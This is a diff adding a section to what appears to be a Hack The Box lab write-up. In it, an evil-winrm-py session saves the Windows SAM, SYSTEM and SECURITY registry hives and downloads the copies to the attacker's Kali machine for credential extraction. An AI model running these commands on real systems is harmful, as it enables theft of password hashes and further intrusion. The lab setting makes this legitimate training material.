@@ -534,5 +534,26 @@ And after logging out and logging back in i am now an admin on `Acute-PC01`
 # Dumping `SAM` `SYSTEM` and `SECURITY`
 
 ```python
+evil-winrm-py PS C:\Utils> reg save hklm\system C:\Temp\system.bak
+The operation completed successfully.
+
+evil-winrm-py PS C:\Utils> reg save hklm\sam C:\Temp\sam.bak
+The operation completed successfully.
+
+evil-winrm-py PS C:\Temp> reg save hklm\security C:\Temp\security.bak
+The operation completed successfully.
+```
+
+First ill save copies to temp
+
+```python
+evil-winrm-py PS C:\Temp> download sam.bak .
+Downloading C:\Temp\sam.bak: 64.0kB [00:00, 209MB/s]                                                         
+[+] File downloaded successfully and saved as: /home/kali/htb/acute/sam.bak
+evil-winrm-py PS C:\Temp> download system.bak .
+Downloading C:\Temp\system.bak: 100%|███████████████████████████████████| 11.6M/11.6M [00:05<00:00, 2.42MB/s]
+[+] File downloaded successfully and saved as: /home/kali/htb/acute/system.bak
 
 ```
+
+
